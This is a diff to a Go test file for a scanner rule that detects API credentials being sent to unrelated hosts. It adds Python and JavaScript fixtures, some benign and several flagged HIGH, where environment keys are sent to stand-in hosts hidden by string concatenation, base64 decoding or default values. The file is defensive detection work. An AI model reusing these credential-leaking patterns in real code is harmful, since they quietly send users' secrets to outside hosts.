@@ -45,6 +45,19 @@ func TestTT3IgnoresCredentialUsedOnlyForAuthentication(t *testing.T) {
 		{"own api with token in host", "a.py", "python", "import os, requests\n" +
 			"key = os.environ[\"OPENAI_API_KEY\"]\n" +
 			"requests.post(\"https://api.openai.com/v1/chat/completions\", headers={\"Authorization\": \"Bearer \" + key}, json={\"model\": \"x\"})\n"},
+		{"key and url returned by a helper", "a.py", "python", "import os, requests\n" +
+			"ENDPOINTS = {\"global\": \"https://api.minimax.io/v1/gen\", \"cn\": \"https://api.minimax.chat/v1/gen\"}\n" +
+			"def key_and_url(region):\n" +
+			"    api_key = os.environ.get(\"MINIMAX_API_KEY\")\n" +
+			"    url = ENDPOINTS.get(region)\n" +
+			"    return api_key, url\n" +
+			"def generate(region):\n" +
+			"    api_key, url = key_and_url(region)\n" +
+			"    headers = {\"Authorization\": f\"Bearer {api_key}\"}\n" +
+			"    return requests.post(url, headers=headers, json={\"prompt\": \"x\"})\n"},
+		{"env host with empty default", "a.py", "python", "import os, requests\n" +
+			"base = os.environ.get(\"CITY_BASE_URL\", \"\")\n" +
+			"requests.get(base + \"/v1/me\", headers={\"Authorization\": os.environ[\"CITY_API_KEY\"]})\n"},
 		{"host from a function argument", "a.py", "python", "import os, requests\n" +
 			"def call(base_url, path):\n" +
 			"    return requests.get(base_url + path, headers={\"Authorization\": os.getenv(\"LLM_API_KEY\")})\n"},
@@ -149,6 +162,28 @@ func TestTT3ReportsAuthHeaderToAnotherHost(t *testing.T) {
 		{"two credentials in one request", "a.py", "python", "CRITICAL", "import os, requests\n" +
 			"headers = {\"Authorization\": os.getenv(\"GITHUB_TOKEN\"), \"X-API-Key\": os.getenv(\"GITHUB_API_KEY\")}\n" +
 			"requests.get(\"https://api.github.com/user\", headers=headers)\n"},
+		{"concatenated literal host", "a.py", "python", "HIGH", "import os, requests\n" +
+			"host = \"https://metrics.\" + \"example.invalid\"\n" +
+			"requests.get(host + \"/ping\", headers={\"Authorization\": \"Bearer \" + os.environ[\"OPENAI_API_KEY\"]})\n"},
+		{"decoded host", "a.py", "python", "HIGH", "import os, base64, requests\n" +
+			"url = base64.b64decode(\"aHR0cHM6Ly9leGFtcGxlLmludmFsaWQ=\").decode()\n" +
+			"requests.get(url, headers={\"Authorization\": \"Bearer \" + os.environ[\"OPENAI_API_KEY\"]})\n"},
+		{"env host with a literal default", "a.py", "python", "HIGH", "import os, requests\n" +
+			"url = os.environ.get(\"TELEMETRY_URL\", \"https://metrics.example.invalid/ping\")\n" +
+			"requests.get(url, headers={\"Authorization\": \"Bearer \" + os.environ[\"OPENAI_API_KEY\"]})\n"},
+		{"argument with a literal default", "a.py", "python", "HIGH", "import os, requests\n" +
+			"def ping(url=\"https://metrics.example.invalid/ping\"):\n" +
+			"    requests.get(url, headers={\"Authorization\": os.getenv(\"OPENAI_API_KEY\")})\n"},
+		{"url returned by a helper to another host", "a.py", "python", "HIGH", "import os, requests\n" +
+			"ENDPOINTS = {\"global\": \"https://metrics.example.io/v1/gen\", \"cn\": \"https://metrics.example.chat/v1/gen\"}\n" +
+			"def key_and_url(region):\n" +
+			"    api_key = os.environ.get(\"MINIMAX_API_KEY\")\n" +
+			"    url = ENDPOINTS.get(region)\n" +
+			"    return api_key, url\n" +
+			"def generate(region):\n" +
+			"    api_key, url = key_and_url(region)\n" +
+			"    headers = {\"Authorization\": f\"Bearer {api_key}\"}\n" +
+			"    return requests.post(url, headers=headers, json={\"prompt\": \"x\"})\n"},
 		{"js key to an unrelated fixed host", "a.js", "javascript", "HIGH", "const key = process.env.GITHUB_TOKEN;\n" +
 			"fetch(\"https://stats.example.invalid/hit\", { headers: { Authorization: `token ${key}` } });\n"},
 	}
